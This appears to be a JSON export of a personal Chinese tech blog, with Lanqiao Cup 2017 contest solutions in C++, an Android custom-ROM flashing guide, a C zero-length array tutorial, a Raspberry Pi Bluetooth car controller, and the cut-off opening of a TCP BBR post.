[{"title":"2017第八届蓝桥杯决赛题目解析(1)：36进制","url":"/2017/05/28/2017%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90(1)36%E8%BF%9B%E5%88%B6/","content":"问题描述：\n\n对于16进制，我们使用字母A-F来表示10及以上的数字。如法炮制，一直用到字母Z，就可以表示36进制。36进制中，A表示10，Z表示35，AA表示370。你能算出MANY表示的数字用10进制表示是多少吗？请提交一个整数，不要填写任何多余的内容（比如：说明文字）\n\n问题分析：\n​作为蓝桥杯一贯的风格，省赛时候就有各种水题，国赛也不例外，这种题目甚至不需要编程解决，用excel，windows自带的计算器等工具，一般都能解决。\n​但为了表述问题解决策略，还是贴出代码以供参考。\n问题答案：\n​1040254\n代码：\n#include &lt;iostream&gt;int conversion(char t) &#123; // 对36进制的单数字转换为10进制     if (&#x27;0&#x27; &lt;= t and t &lt;= &#x27;9&#x27;)        return t - &#x27;0&#x27;;    else        return t - &#x27;A&#x27; + 10; &#125; int main() &#123;    std::cout &lt;&lt; conversion(&#x27;M&#x27;) * 36 * 36 * 36 + \\        conversion(&#x27;A&#x27;) * 36 * 36 + \\        conversion(&#x27;N&#x27;) * 36 + \\        conversion(&#x27;Y&#x27;);    return 0;&#125;\n"},{"title":"2017第八届蓝桥杯决赛题目解析(4)：发现环","url":"/2017/05/28/2017%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90(4)%E5%8F%91%E7%8E%B0%E7%8E%AF/","content":"题目描述：\n\n小明的实验室有N台电脑，编号1~N。原本这N台电脑之间有N-1条数据链接相连，恰好构成一个树形网络。在树形网络上，任意两台电脑之间有唯一的路径相连。\n不过在最近一次维护网络时，管理员误操作使得某两台电脑之间增加了一条数据链接，于是网络中出现了环路。环路上的电脑由于两两之间不再是只有一条路径，使得这些电脑上的数据传输出现了BUG。\n为了恢复正常传输。小明需要找到所有在环路上的电脑，你能帮助他吗？\n\n\n输入：\n第一行包含一个整数N。\n以下N行每行两个整数a和b，表示a和b之间有一条数据链接相连。\n对于30%的数据，1 ≤ N ≤ 1000\n对于100%的数据, 1 ≤ N ≤ 100000，1 ≤ a, b ≤ N\n输入保证合法。\n\n\n输出：\n按从小到大的顺序输出在环路上的电脑的编号，中间由一个空格分隔。\n\n\n样例输入： 5 1 2 3 1 2 4 2 5 5 3\n\n\n样例输出： 1 2 3 5\n\n\n资源约定：\n峰值内存消耗 &lt; 256M\nCPU消耗 &lt; 1000ms\n请严格按要求输出，不要画蛇添足地打印类似：“请您输入…”\n的多余内容。\n所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。\n注意: main函数需要返回0\n注意: 只使用ANSI C/ANSI C++\n标准，不要调用依赖于编译环境或操作系统的特殊函数。\n注意: 所有依赖的函数必须明确地在源文件中 #include\n，\n不能通过工程设置而省略常用头文件。提交时，注意选择所期望的编译器类型。\n\n问题分析：\n​这题可能是上天对我的照顾，在2016NOIP\nDAY2的三道题中，我依稀记得是第二道题，当时也是一道类似的题，不过这题是仅单环，那一道题是多环。\n​\n当时所用的策略是遍历-&gt;深搜度为1的点-&gt;删点-&gt;直到点不在减少，但当时有个问题，就是深搜深度过深，导致栈溢出，幸好当时组委会另行通知了这一点，并在评测机器上有所更改。\n​ 但这次最大节点数为10w，并不算大，可以进行dfs\n​ 在存储边上，用vector存储邻接表\n​ 并通过 vector,algorithm 中的 sort 进行优化\n代码：\n#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;vector&gt;const int N = 10000 + 10;int n;std::vector&lt;int&gt; next[N];bool vis[N];void init() &#123;    memset(vis, false, sizeof(vis));    std::cin &gt;&gt; n;    for (int i = 1; i &lt;= n; i++) &#123;        int a, b;        std::cin &gt;&gt; a &gt;&gt; b;        next[a].push_back(b);   // 无向图，存双边        next[b].push_back(a);    &#125;&#125;void dfs(int k) &#123;    int side = 0;    for (int j : next[k]) &#123;        if (!vis[j])            side++;    &#125;    if (side == 1 &amp;&amp; !vis[k]) &#123;        vis[k] = true;        dfs(next[k][0]);    &#125;&#125;void work() &#123;    int remain = n;    int tem_remain;    do &#123;        tem_remain = remain;        for (int i = 1; i &lt;= n; i++) &#123;            int side = 0;            for (int j : next[i]) &#123;                if (!vis[j])                    side++;            &#125;            if (side == 1 &amp;&amp; !vis[i]) &#123;                vis[i] = true;                tem_remain -= 1;                dfs(next[i][0]);            &#125;        &#125;    &#125; while (tem_remain != remain);    for (int i = 1; i &lt;= n; i++)        if (!vis[i])            std::cout &lt;&lt; i &lt;&lt; &quot; &quot;;&#125;int main() &#123;    init();    work();    return 0;&#125;\n"},{"title":"2017第八届蓝桥杯决赛题目解析(3)：希尔伯特曲线","url":"/2017/05/28/2017%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90(3)%E5%B8%8C%E5%B0%94%E4%BC%AF%E7%89%B9%E6%9B%B2%E7%BA%BF/","content":"问题描述：\n\n希尔伯特曲线是以下一系列分形曲线 Hn\n的极限。我们可以把 Hn\n看作一条覆盖$2^n × 2^n $方格矩阵的曲线，曲线上一共有 2n ⋅ 2n个顶点(包括左下角起点和右下角终点)，恰好覆盖每个方格一次。\n\nHn(n &gt; 1)可以通过如下方法构造：\n\n将 Hn − 1顺时针旋转90度放在左下角\n将 Hn − 1逆时针旋转90度放在右下角\n将2个$ H_n-1$ 分别放在左上角和右上角\n用3条单位线段把4部分连接起来对于 Hn 上每一个顶点\np ，我们定义 p\n的坐标是它覆盖的小方格在矩阵中的坐标（左下角是 (1, 1)，右上角是 (2n, 2n)\n，从左到右是X轴正方向，从下到上是Y轴正方向），定义 p的序号是它在曲线上从起点开始数第几个顶点（从1开始计数）。\n\n\n\n以下程序对于给定的 n(n &lt;  = 30) 和 p 点坐标 (x, y) ，输出 p\n点的序号。请仔细阅读分析源码，填写划线部分缺失的内容。\n\n#include &lt;stdio.h&gt;long long f(int n, int x, int y) &#123;    if (n == 0) return 1;    int m = 1 &lt;&lt; (n - 1);    if (x &lt;= m &amp;&amp; y &lt;= m) &#123;        return f(n - 1, y, x);    &#125;    if (x &gt; m &amp;&amp; y &lt;= m) &#123;        return 3LL * m * m + f(n - 1, __________ , m * 2 - x + 1); //  填空    &#125;    if (x &lt;= m &amp;&amp; y &gt; m) &#123;        return 1LL * m * m + f(n - 1, x, y - m);    &#125;    if (x &gt; m &amp;&amp; y &gt; m) &#123;        return 2LL * m * m + f(n - 1, x - m, y - m);    &#125;&#125;int main() &#123;int n, x, y;    scanf(&quot;%d %d %d&quot;, &amp;n, &amp;x, &amp;y);     printf(&quot;%lld&quot;, f(n, x, y));    return 0;&#125;\n问题分析：\n​这题题目表述很多，但其实没有么有想象中那么难，规律性极强，主要一个坑点是入曲线的方向问题，一开始以为是从左边进入（答案y），后来验证出错，正确应该是从右边进入。\n答案：\n​ m-y+1\n"},{"title":"2017第八届蓝桥杯决赛题目解析(2)：瓷砖样式","url":"/2017/05/28/2017%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90(2)%E7%93%B7%E7%A0%96%E6%A0%B7%E5%BC%8F/","content":"问题描述：\n\n小明家的一面装饰墙原来是3*10的小方格。现在手头有一批刚好能盖住2个小方格的长方形瓷砖。\n瓷砖只有两种颜色：黄色和橙色。小明想知道，对于这么简陋的原料，可以贴出多少种不同的花样来。\n小明有个小小的强迫症：忍受不了任何2*2的小格子是同一种颜色。\n（瓷砖不能切割，不能重叠，也不能只铺一部分。另外，只考虑图案，请忽略瓷砖的拼接）\n显然，对于2*3的小格子来说，口算都可以知道：一共10中贴法，如图所示：\n但对于3*10的格子呢？肯定是个不小的数目，请你利用计算机的威力算出该数字。\n注意：你需要提交的是一个整数，不要填写任何多余的内容（比如：说明性文字）\n\n\n问题分析：\n​题目说的很长，但中心思想一句话就可以概括：用2种 2*1 瓷砖，覆盖 10*3\n的墙面，保证没有 2*2 颜色相同，请问有多少种情况？\n​考场上初步想来，直接暴力搜索所有解，最后对所有解进行判定合，足够秒出结果。而且代码简单，不会花费过多时间，为后面大分题准备。\n​现在想来，其实不必对所有解进行判合法，在中途选择瓷砖时，就可以进行判定，这样可以降低时间复杂度。\n问题答案：\n​114434\n代码：\n#include &lt;iostream&gt;int a[5][12];   //  -1代表未摆放，1代表黄色，2代表橙色 int res = 0;bool judge(int x, int y) &#123;    if (a[x][y] == a[x - 1][y - 1] &amp;&amp; a[x][y] == a[x - 1][y] &amp;&amp; a[x][y] == a[x][y - 1])        return false;    if (a[x][y] == a[x - 1][y] &amp;&amp; a[x][y] == a[x - 1][y + 1] &amp;&amp; a[x][y] == a[x][y + 1])        return false;    if (a[x][y] == a[x][y - 1] &amp;&amp; a[x][y] == a[x + 1][y - 1] &amp;&amp; a[x][y] == a[x + 1][y])        return false;    return true;&#125;void dfs(int x, int y) &#123;    if (x == 3 &amp;&amp; y == 10) &#123;        res++;        return;    &#125;    if (y &gt; 10) &#123;        dfs(x + 1, 0);        return;    &#125;    if (a[x][y] == -1) &#123;        if (a[x][y + 1] == -1)  // 竖着铺         &#123;            a[x][y] = 1;            a[x][y + 1] = 1;            if (judge(x, y))    // 边铺边判合法                 dfs(x, y + 1);            a[x][y] = -1;            a[x][y + 1] = -1;            a[x][y] = 2;            a[x][y + 1] = 2;            if (judge(x, y))                dfs(x, y + 1);            a[x][y] = -1;            a[x][y + 1] = -1;        &#125;        if (a[x + 1][y] == -1)  // 横着铺         &#123;            a[x][y] = 1;            a[x + 1][y] = 1;            if (judge(x, y))                dfs(x, y + 1);            a[x][y] = -1;            a[x + 1][y] = -1;            a[x][y] = 2;            a[x + 1][y] = 2;            if (judge(x, y))                dfs(x, y + 1);            a[x][y] = -1;            a[x + 1][y] = -1;        &#125;    &#125; else &#123;        dfs(x, y + 1);    &#125;&#125;int main() &#123;    int i, j;    for (i = 1; i &lt;= 3; i++)        for (j = 1; j &lt;= 10; j++)            a[i][j] = -1;    dfs(1, 1);    std::cout &lt;&lt; res;    return 0;&#125;\n"},{"title":"2017第八届蓝桥杯决赛题目解析(5)：对局匹配","url":"/2017/05/29/2017%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90(5)%E5%AF%B9%E5%B1%80%E5%8C%B9%E9%85%8D/","content":"题目描述：\n\n小明喜欢在一个围棋网站上找别人在线对弈。这个网站上所有注册用户都有一个积分，代表他的围棋水平。\n小明发现网站的自动对局系统在匹配对手时，只会将积分差恰好是K的两名用户匹配在一起。如果两人分差小于或大于K，系统都不会将他们匹配。\n现在小明知道这个网站总共有N名用户，以及他们的积分分别是A1, A2, …\nAN。\n小明想了解最多可能有多少名用户同时在线寻找对手，但是系统却一场对局都匹配不起来(任意两名用户积分差不等于K)？\n\n\n输入：\n第一行包含两个个整数N和K。\n第二行包含N个整数A1, A2, … AN。\n对于30%的数据，1 ≤ N ≤ 10​\n对于100%的数据，1 ≤ N ≤ 100000, 0 ≤ Ai ≤ 100000, 0 ≤ K ≤ 100000\n\n\n输出：\n一个整数，代表答案。\n\n\n样例输入： 5 1 2 3 1 2 4 2 5 5 3\n\n\n样例输出： 6\n\n\n再比如，\n样例输入：\n10 1\n2 1 1 1 1 4 4 3 4 4\n\n\n样例输出： 8\n\n\n资源约定：\n峰值内存消耗 &lt; 256M\nCPU消耗 &lt; 1000ms\n请严格按要求输出，不要画蛇添足地打印类似：“请您输入…”\n的多余内容。\n所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。\n注意: main函数需要返回0\n注意: 只使用ANSI C/ANSI C++\n标准，不要调用依赖于编译环境或操作系统的特殊函数。\n注意: 所有依赖的函数必须明确地在源文件中 #include\n，\n不能通过工程设置而省略常用头文件。提交时，注意选择所期望的编译器类型。\n\n问题分析：\n​这题就相较于前几题就有难度提升，不在依靠于单一基础算法就能较好的解决问题。\n​比赛时，我一开始就认为搜索能解决问题，纸上推演的半个小时才发现有问题，始终是一个NP问题。后来经过分析：这样的策略可能达到解决问题的目的：\n\n因为当K&gt;0时，若选值为m的点，则应该选上值为m的所有点，依照桶排序的思想，进行优化\n当K=0时，最大选择数=不同值的点的类别数\n依照K值，形成关系链（可以为多条关系链）\n单一关系链中，选择类数和并且不关联的最大一个或几个点，该算法应为动态规划\n\n如图所示：\n输入：\n22 2  2 1 1 1 1 4 4 3 4 4 6 7 7 8 8 8 8 9 11 11 12 13\n\n\n第一条链最大个数和：4\n第二条链最大个数和：8\n第三条链最大个数和：2\n第四条链最大个数和：2\n第五条链最大个数和：1\n\n最大个数和：4 + 8 + 2 + 2 + 1 = 17\n代码：\n#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;array&gt;const int N = 100000;int n, k;std::array&lt;int, N&gt; num&#123;0&#125;;std::vector&lt;int&gt; link[N];int node[N];int num_node = 0;int num_link = 0;   // 关系链数std::array&lt;short, N&gt; vis&#123;0&#125;;    // 1代表已访问，0代表未访问，-1代表点不存在std::array&lt;int, N&gt; F&#123;0&#125;; // dp F[i]=max(F[i-1],F[F-2]+num[i])long long tot = 0;void init() &#123;    std::cin &gt;&gt; n &gt;&gt; k;    for (int i = 1; i &lt;= n; i++) &#123;        int t;        std::cin &gt;&gt; t;        num[t]++;        vis[i] = -1;    &#125;&#125;void work() &#123;    for (int i = 0; i &lt;= N; i++)        if (num[i] != 0) &#123;            node[num_node++] = i;            vis[i] = 0;        &#125;    for (int i = 0; i &lt; num_node; i++) &#123;        if (vis[node[i]] == 0) &#123;            vis[node[i]] = 1;            link[num_link].push_back(node[i]);            int next = node[i] + k;            while (vis[next] == 0) &#123;                link[num_link].push_back(next);                vis[next] = 1;                next = next + k;            &#125;            num_link++;        &#125;    &#125;&#125;void dp() &#123;    for (int i = 0; i &lt; num_link; i++) &#123;        F.fill(0);        for (int j = 0; j &lt; link[i].size(); j++) &#123;            if (j &gt;= 2)                F[j] = std::max(F[j - 1], F[j - 2] + num[link[i][j]]);            else if (j == 0)                F[j] = num[link[i][j]];            else if (j == 1)                F[j] = std::max(F[j - 1], num[link[i][j]]);        &#125;        // std::cout &lt;&lt; F[link[i].size() - 1] &lt;&lt; std::endl;        tot += F[link[i].size() - 1];    &#125;&#125;int main() &#123;    init();    work();    dp();    std::cout &lt;&lt; tot;    /*    for (int i = 0; i &lt; num_node; i++)        std::cout &lt;&lt; node[i] &lt;&lt; &quot;-&gt;&quot; &lt;&lt; num[node[i]] &lt;&lt; &quot; &quot;;    std::cout &lt;&lt; std::endl;    for (int i = 0; i &lt; num_link; i++) &#123;        for (int j : link[i]) &#123;            std::cout &lt;&lt; j &lt;&lt; &quot; &quot;;        &#125;        std::cout &lt;&lt; std::endl;    &#125;    */    return 0;&#125;\n"},{"title":"2017第八届蓝桥杯决赛题目解析(6)：观光旅游","url":"/2017/05/29/2017%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90(6)%E8%A7%82%E5%85%89%E6%97%85%E6%B8%B8/","content":"题目描述：\n\n跳蚤国正在大力发展旅游业，每个城市都被打造成了旅游景点。\n许多跳蚤想去其他城市旅游，但是由于跳得比较慢，它们的愿望难以实现。这时，小C听说有一种叫做火车的交通工具，在铁路上跑得很快，便抓住了商机，创立了一家铁路公司，向跳蚤国王请示在每两个城市之间都修建铁路。\n然而，由于小C不会扳道岔，火车到一个城市以后只能保证不原路返回，而会随机等概率地驶向与这个城市有铁路连接的另外一个城市。跳蚤国王向广大居民征求意见，结果跳蚤们不太满意，因为这样修建铁路以后有可能只游览了3个城市（含出发的城市）以后就回来了，它们希望能多游览几个城市。于是跳蚤国王要求小C提供一个方案，使得每只跳蚤坐上火车后能多游览几个城市才回来。\n小C提供了一种方案给跳蚤国王。跳蚤国王想知道这个方案中每个城市的居民旅游的期望时间（设火车经过每段铁路的时间都为1），请你来帮跳蚤国王。\n\n\n【输入格式】\n输入的第一行包含两个正整数n、m，其中n表示城市的数量，m表示方案中的铁路条数。\n接下来m行，每行包含两个正整数u、v，表示方案中城市u和城市v之间有一条铁路。\n保证方案中无重边无自环，每两个城市之间都能经过铁路直接或间接到达，且火车由任意一条铁路到任意一个城市以后一定有路可走。\n\n\n【输出格式】\n输出n行，第i行包含一个实数ti，表示方案中城市i的居民旅游的期望时间。你应当输出足够多的小数位数，以保证输出的值和真实值之间的绝对或相对误差不超过e−9。\n\n\n【样例输入】 4 5 1 2 2 3 3 4 4 1 1 3\n\n\n【样例输出】 3.333333333333 5.000000000000\n3.333333333333 5.000000000000\n\n\n【样例输入】\n10 15 1 2 1 9 1 5 2 3 2 7 3 4 3 10 4 5 4 8 5 6 6 7 6 10 7 8 8 9 9\n10\n\n\n【样例输出】 10.000000000000 10.000000000000\n10.000000000000 10.000000000000 10.000000000000 10.000000000000\n10.000000000000 10.000000000000 10.000000000000 10.000000000000\n\n\n【数据规模与约定】 对于10%的测试点，n ≤ 10； 对于20%的测试点，n ≤ 12； 对于50%的测试点，n ≤ 16； 对于70%的测试点，n ≤ 19； 对于100%的测试点，4 ≤ k ≤ n ≤ 21，1 ≤ u, v ≤ n。数据有梯度。\n\n\n资源约定：\n峰值内存消耗 &lt; 256M\nCPU消耗 &lt; 1000ms\n请严格按要求输出，不要画蛇添足地打印类似：“请您输入…”\n的多余内容。\n所有代码放在同一个源文件中，调试通过后，拷贝提交该源码。\n注意: main函数需要返回0\n注意: 只使用ANSI C/ANSI C++\n标准，不要调用依赖于编译环境或操作系统的特殊函数。\n注意: 所有依赖的函数必须明确地在源文件中 #include\n，\n不能通过工程设置而省略常用头文件。提交时，注意选择所期望的编译器类型。\n\n问题分析：\n​这道问题真的很难，当时间也很紧，就剩余20分钟左右，考试直接放弃了。现在并没有明确思路，待网上有题解后，有机会再补充。\n"},{"title":"2017（cumcm）全国大学生数学建模大赛论文LaTex版","url":"/2017/10/28/2017%EF%BC%88cumcm%EF%BC%89%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%E5%A4%A7%E8%B5%9B%E8%AE%BA%E6%96%87LaTex%E7%89%88/","content":"\n一个多月前和小伙伴熬了3天完成了2017数学建模，最后结果暂时还没出，估计也不理想。\n但是好不容易写完论文，感觉排版不好，于是借助国赛$\\LaTeX$模板，对论文进行重新排版，并且进一步完善。\n经过前前后后一个月的时间，倒是做完了。现在看来，结果怎样倒是没什么了，有了这一次$\\LaTeX​$排版的经验，反而收获不少。\n顺便附上排版环境与最终论文：\n\n系统：Ubuntu 17.10 amd64\ntex发行版本：texlive-2017\nLaTex编译器：xelatex\nbibTex编译器：xelatex\n编辑器：atom(插件：atom-latex language-latex pdf-view\nsimplified-chinese-menu)\n\n\nlatex模板地址\n拍照赚钱”的任务定价与任务分配的分析与探讨.pdf\n"},{"title":"2017第八届蓝桥杯国赛(CC++ B组)解题报告","url":"/2017/05/29/2017%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%9B%BD%E8%B5%9B(CC++%20B%E7%BB%84)%E8%A7%A3%E9%A2%98%E6%8A%A5%E5%91%8A/","content":"\n2017第八届蓝桥杯决赛题目解析(1)：36进制\n2017第八届蓝桥杯决赛题目解析(2)：瓷砖样式\n2017第八届蓝桥杯决赛题目解析(3)：希尔伯特曲线\n2017第八届蓝桥杯决赛题目解析(4)：发现环\n2017第八届蓝桥杯决赛题目解析(5)：对局匹配\n2017第八届蓝桥杯决赛题目解析(6)：观光旅游\n"},{"title":"Android-Nougat(7.1.1)的原生体验","url":"/2017/06/22/Android-Nougat(7.1.1)%E7%9A%84%E5%8E%9F%E7%94%9F%E4%BD%93%E9%AA%8C/","content":"\n本人常用Mi5s,伴随着MIUI9（7.0）内测，实在等不急官网放MIUI的包（其实是不想使用MIUI，设计风格跟原生差异太大）。\n这几天就靠着以前的所积累的刷机经验，并且刷上刚适配的lineage os\n(CM14.1)，以此为基础，替换AOSP（Android Open-Source\nProject）编码的应用。\n再加 上pixel launcher\n谷歌“亲儿子”的美化和Nougat的优化，对原生的安卓顿生好感。\n当然，刷机过程也是比较曲折的，但总算没有白费精力，为了以后类似操作便捷，特地记录一下。\nStep1: 小米官网解锁fastboot\n​\n小米自从mi4后，为了增强安全性（防止大家乱刷机），至底层加入bl锁，导致刷入第一步需解锁，但刷机有风险，一旦解锁，就失去保修机会，且修改不可逆，小米会将设备解锁信息在服务器上保存，谨慎操作！\n\n解锁网址：http://www.miui.com/unlock/index.html\n解锁步骤：https://jingyan.baidu.com/article/29697b9103205dab20de3c33.html\n\nStep2:\nadb刷入第三方recovery(TWRP)\n\n去https://twrp.me/下载最新的TWRP(我当时最新版本3.1.1.0)，为之后刷第三方系统做准备，并用adb(Android\nDebug Bridge)工具包刷入TWRP\n\nADB下载地址：http://adbshell.com/downloads 选择ADB Kits\n\n手机关机进入fastboot模式（音量键下+电源键），USB连接电脑，装上驱动（用官方驱动或者第三方驱动安装软件）\n\npowershell 刷入命令\n.\\fastboot flash recovery XXX.img\n\nXXX.img代表TWRP所下载的文件名\n\n\n最后输入命令重启，再关机，按住 音量键上+电源键 进入recovery模式\n\n.\\fastboot reboot\nSetp3: 刷入lineage os(with\nroot)\n去lineage\nos官网下载rom包和root包，在recovery模式下，用TWRP依次刷入两个包\n网址：https://download.lineageos.org/\n注意：根据设备cpu类型选择root包（我的是arm64,安卓7.1）\nStep4: 刷入openGapps（aroma）\n网址：http://opengapps.org/\n根据设备类型选择包\n\naroma ：\n图形化安装版本，可以自定义所需刷入的应用。（但有些机型会由于recovery的原因无法使用）。\nsuper\n：最为完备的版本，该有的和不该有的都有了（比如日语输入法、注音输入法、等大陆用户基本上不会需要的应用）\nstock ：包括 nexus\n出厂所具备的所有应用，在安装好 CM 、魔趣等系统后，刷入该包会自动替换掉\nAosp 的应用 ，比如 Google 相机、Gmail、Google Now 桌面、Google\n相册分别替换掉 Aosp所带的 相机、 邮件、桌面、相册等，当然\nGoogle全家桶的其他软件如 Gooele Play、Youtube、地图、Gooele\nkeep等也会随之刷入你手机。\nfull ：与 stock 唯一区别就在于不会替换掉 Aosp\n应用。\nmini、micro、nano、pico\n：依次减少应用，但都具备 Google service 和\nPlay\n\n推荐nano包，但下载时需要一个稳定的梯子，建议用chrome直接下载，最后用TWRP刷入既可。\nStep5:\n精简部分不需要系统应用+修改hosts\n该布操作最简单，但比较繁琐，用root删除掉内置的一些不需要使用的google应用，比如其他语言输入法，删除完后重启手机一次。\n用go hosts\nAPP替换掉原始hosts，使设备能直接访问谷歌（该操作并不完美，但可以用做备用）\nStep6:\n刷入Magisk框架并接入viperfx音效\n因为手机并不自带音效改善软件，且不带HIFI模块的手机插手机的音效很差，所以这里刷入现在口碑最好的viperfx音效，但直接刷入时会存在I/O报错，root报错等原因，所以这里借助Magisk框架修改系统API接口实现同等功能\nMagisk 下载网址：https://forum.xda-developers.com/apps/magisk/official-magisk-v7-universal-systemless-t3473445\n\n先TWRP刷入Magisk ；\n再开机安装Magisk Manager\napk；\n最后在magisk中安装viperfx即可。\n\n最终效果图\n\n"},{"title":"C语言零长数组使用技巧","url":"/2024/02/16/C%E8%AF%AD%E8%A8%80%E9%9B%B6%E9%95%BF%E6%95%B0%E7%BB%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/","content":"C语言零长数组使用技巧\n在标准C语言（ANSI C）中规定不能定义长度为0的数组。标准可见 ISO\n9899:2011 章节 6.7.6.2\n\n\n数组长度的声明表达式中，如果表达式是一个常量表达式，它的值应该大于零。\n\n但是，有些编译器就把0长度的数组成员作为自己的非标准扩展，例如GNU\nC —— Arrays of\nLength Zero。 \n什么是零长数组\n#include &lt;stdio.h&gt;int main() &#123;    int buf[0];    printf(&quot;sizeof(int[0]) = %lu&quot;, sizeof(buf));    //      sizeof(int[0]) = 0    return 0;&#125;\n在程序中定义一个零长度数组，sizeof()\n计算出大小为0，也就是说，零长数组是不占用内存空间的。\n怎么使用零长数组\n零长度数组一般不单独使用，它常常作为结构体的最后一个成员，构成一个变长结构体。\n我们定义一个结构体用于接受对端发送的所有传感器数据：\ntypedef struct &#123;    uint8_t sensor_num;         // 传感器数量    uint8_t single_info_size;   // 单个传感器数据size    SENSOR_INFO_S info[0];      // 定义一个零长结构体数组，表示具体数据，数据大小 = sensor_num * sensor_info_size&#125; SENSOR_RSP_S;\n当然我们也可以申请一个指针，指向紧挨SENSOR_RSP_S\n结构体的下一个地址，比起指针，用零长数组有这样的优势：\n\n不需要初始化，数组名直接就是所在的偏移；\n不占任何空间，指针需要占用空间，空数组不占任何空间。意味着无需初始化，数组名就是后面元素的地址，直接就能当指针使用。\n\n使用以上定义的结构体实现以下功能：\n// 对rsp地址赋值const SENSOR_RSP_S *rsp = get_sensor_data();size_t rsp_len = get_sensor_data_length();// 判断长度合法性，直接使用sizeof(SENSOR_RSP_S)if (rsp_len != sizeof(SENSOR_RSP_S) + rsp-&gt;sensor_num * rsp-&gt;single_info_size) &#123;    ...&#125;// 遍历访问数据，数据描述和数据内容均来自rsp，理解清晰for (size_t i = 0; i &lt; rsp-&gt;sensor_num; i++) &#123;    show_sensor(rsp-&gt;info[i]);&#125;\n"},{"title":"App Inventor2 用蓝牙与树莓派小车通讯","url":"/2017/12/16/App%20Inventor2%20%E7%94%A8%E8%93%9D%E7%89%99%E4%B8%8E%E6%A0%91%E8%8E%93%E6%B4%BE%E5%B0%8F%E8%BD%A6%E9%80%9A%E8%AE%AF/","content":"\nApp Inventor开发\nApp Inventor 2\n\nAndroid应用开发者（英语：App\nInventor）是一款卡通图形界面的Android智能手机应用程序开发软件。它起先由Google提供的应用软件，现在由麻省理工学院维护及营运。\n\n借助IA2 建立一个简易的游戏手柄。因为AI2\n的蓝牙串口通讯协议是基于SPP（Serial Port\nProfile）串行端口配置。我们目的是并设定相对应代码，在手机发送，在树莓派解析，并对小车进行运动控制。\n对应代码如下：\n\nu –&gt; 前进 gofront()\nd –&gt; 后退 goback()\nl –&gt; 左转 turnleft()\nr –&gt; 右转 turnright()\ns –&gt; 停止 istop()\n\n每次代码运行周期为20ms\n\nai2截面图\n\n树莓派蓝牙SPP设置\n树莓派蓝牙配置\n\n安装支持包\nsudo apt-get install pi-bluetoothsudo apt-get install bluetooth bluez blueman\n添加pi用户到蓝牙组\nsudo usermod -G bluetooth -a piservice bluetooth status\n启动/增加SPP\nsudo nano /etc/systemd/system/dbus-org.bluez.service\n修改内容如下:\nExecStart=/usr/lib/bluetooth/bluetoothd -CExecStartPost=/usr/bin/sdptool add SP\n重启，启动蓝牙串口\nsudo rfcomm watch hci0\n\n串口调试软件xgcom\nsudo git clone https://github.com/helight/xgcom.gitsudo  apt-get install make automake libglib2.0-dev libvte-dev libgtk2.0-devcd xgcomsudo ./autogen.shsudo makesudo make installxgcom\n\n展示与控制代码\n\n\nimport serialimport timefrom btbu_robot.motor import motorbluetooth = serial.Serial(&quot;/dev/rfcomm0&quot;,9600,timeout=0.5)#bluetooth.open()left = motor(22, 27, 17)right = motor(24, 23, 18)def gofront():    left.run(70)    right.run(70)    # print(&quot;前进&quot;)def goback():    left.run(-70)    right.run(-70)    #print(&quot;后退&quot;)def turnleft():    left.run(-70)    right.run(70)    #print(&quot;左转&quot;)def turnright():    #print(&quot;右转&quot;)    left.run(70)    right.run(-70)def istop():    left.run(0)    right.run(0)    #print(&quot;停止&quot;)status = &#x27;&#x27; # 记录当前状态if __name__ == &#x27;__main__&#x27;:while True:    data = bluetooth.readline().decode(&#x27;utf-8&#x27;)    if status == &#x27;u&#x27;: # 前进        gofront()    elif status == &#x27;d&#x27;: # 后退        goback()    elif status == &#x27;l&#x27;: # 左转        turnleft()    elif status == &#x27;r&#x27;: # 右转        turnright()    elif status == &#x27;s&#x27;: # 停止        istop()    while data != &#x27;&#x27;:        status = data[0]        if status == &#x27;u&#x27;: #　前进            gofront()        elif status == &#x27;d&#x27;: #　后退            goback()        elif status == &#x27;l&#x27;: #　左转            turnleft()        elif status == &#x27;r&#x27;: #　右转            turnright()        elif status == &#x27;s&#x27;: # 停止            istop()        data = data[1:]        time.sleep(0.02)    time.sleep(0.02)\n"},{"title":"Google BBR 优化算法，实现TCP加速","url":"/2018/03/18/Google%20BBR%20%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95%EF%BC%8C%E5%AE%9E%E7%8E%B0TCP%E5%8A%A0%E9%80%9F/","content":"\n\n最近，Google 开源了其 TCP BBR 拥塞控制算法，并提交到了 Linux 内核，从\n4.9 开始，Linux 内核已经用上了该算法。根据以往的传统，Google\n总是先在自家的生产环境上线运用后，才会将代码开源，此次也不例外。\n根据实地测试，在部署了最新版内核并开启了 TCP BBR\n的机器上，网速甚至可以提升好几个数量级。\n于是我根据目前三大发行版的最新内核，开发了一键安装最新内核并开启 TCP BBR\n脚本。\n\n本脚本适用环境\n\n系统支持：Ubuntu 12+\n虚拟技术：OpenVZ 以外的，比如 KVM、Xen、VMware 等\n内存要求：≥128M\n日期：2018 年 03 月 20 日\n\n关于本脚本\n\n本脚本已在 digitalocean 上的 